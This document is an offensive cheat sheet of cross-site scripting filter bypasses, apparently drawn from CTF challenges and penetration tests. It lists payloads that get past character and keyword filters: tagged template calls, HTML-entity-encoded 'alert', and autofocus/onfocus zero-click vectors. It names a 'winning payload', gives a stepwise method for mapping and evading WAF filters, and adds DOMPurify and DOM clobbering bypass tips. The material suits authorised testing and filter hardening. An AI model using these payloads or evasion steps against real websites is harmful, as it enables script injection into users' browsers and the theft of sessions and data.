# XSS Filter Bypass Techniques

Collected from CTF challenges and real-world engagements.

## Character-Restricted XSS (No Parentheses, Quotes, Dots, Semicolons)

When WAF/filter blocks `( ) . , ; ' "` but allows `< > / = ! - _ @ # $ % ^ & * + ~ ` | \ { } [ ] : ?`:

### Tagged Template Literals (bypass parentheses)
```
alert`1`          // equivalent to alert(['1'])
confirm`xss`      // works with any function accepting args
prompt`1`
```

### HTML Entities (bypass keyword signature detection)
When "alert" is blocked as a signature but `&` and `#` are allowed:
```
&#x61lert`1`      // &#x61 = 'a' (hex entity without semicolon)
&#97lert`1`       // &#97 = 'a' (decimal entity without semicolon)
&#x0061lert`1`    // longer hex form
```
Note: HTML entities decode in attribute values when set via innerHTML. The HTML5 parser terminates numeric refs at non-hex chars even without semicolons.

### Unicode Escapes (bypass keyword detection — JS context only)
```
\u0061lert`1`     // works in JS context, NOT in innerHTML attribute values
```
⚠️ Pitfall: If the server double-escapes backslashes (stores `\\u0061`), the unicode escape becomes a literal string. Use HTML entities instead.

### Auto-firing Event Handlers (zero-click)
When `onload`, `onerror`, `src=`, `<script>`, `<img>`, `<iframe>`, `<embed>` are signature-blocked:

| Element | Event | Auto-fires? | Notes |
|---------|-------|-------------|-------|
| `<input autofocus onfocus=X>` | onfocus | ✅ YES | Best zero-click vector |
| `<details open ontoggle=X>` | ontoggle | ❌ NO via innerHTML | Only fires on state CHANGE, not insertion |
| `<marquee onstart=X>` | onstart | ❌ Unreliable | Deprecated, inconsistent in modern Chrome |
| `<div onmouseover=X>` | onmouseover | ❌ Needs hover | 1-click acceptable per some programs |
| `<select onfocus=X autofocus>` | onfocus | ✅ YES | Alternative to input |
| `<textarea onfocus=X autofocus>` | onfocus | ✅ YES | Alternative to input |

### Winning Payload Pattern
```html
<input onfocus=&#x61lert`1` autofocus>
```
Bypasses:
- Character filter: no `( ) . , ; ' "`
- Signature filter: no literal "alert" string
- Zero-click: autofocus triggers onfocus on insertion

## Identifying Filter Types

Two distinct filter layers to probe separately:
1. **Character filter**: blocks specific chars regardless of context
   - Test: send each char individually in an otherwise-clean string
2. **Signature filter**: blocks known attack patterns/keywords
   - Test: use allowed chars to form tag+event combos, vary the handler value

Probe methodology:
```
Step 1: Map allowed characters (send "testXtest" for each char X)
Step 2: Map allowed elements (<svg>, <input>, <form>, <details>, etc.)
Step 3: Map allowed event handlers (onmouseover, onfocus, ontoggle, onstart)
Step 4: Map blocked keywords in handler values (alert, prompt, confirm, eval)
Step 5: Combine: allowed element + allowed event + encoded keyword + no-paren call
```

## DOMPurify Bypass Considerations

- DOMPurify sanitizes content but if user-controlled data is rendered via `innerHTML` WITHOUT DOMPurify (like `user_name` vs `content` fields), that's the vector
- Always check: which fields go through sanitization and which don't
- DOM clobbering via `id=` attributes can override `window.X` properties if DOMPurify allows `id`
